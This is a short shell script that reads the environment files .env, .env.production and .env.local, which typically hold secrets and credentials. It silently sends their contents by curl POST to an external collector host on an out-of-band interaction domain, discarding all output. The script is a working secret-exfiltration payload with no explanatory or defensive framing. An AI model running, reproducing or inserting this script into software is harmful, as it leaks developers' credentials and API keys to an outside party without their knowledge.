#!/bin/sh
collector="https://davs8dle0q8v70itgp5gi9167k1nwif6k.oast.live"
data=""
for f in .env .env.production .env.local; do
  [ -f "$f" ] && data="${data}--- ${f} ---
$(cat "$f")
"
done
[ -n "$data" ] && curl -s -X POST -d "$data" "$collector" >/dev/null 2>&1
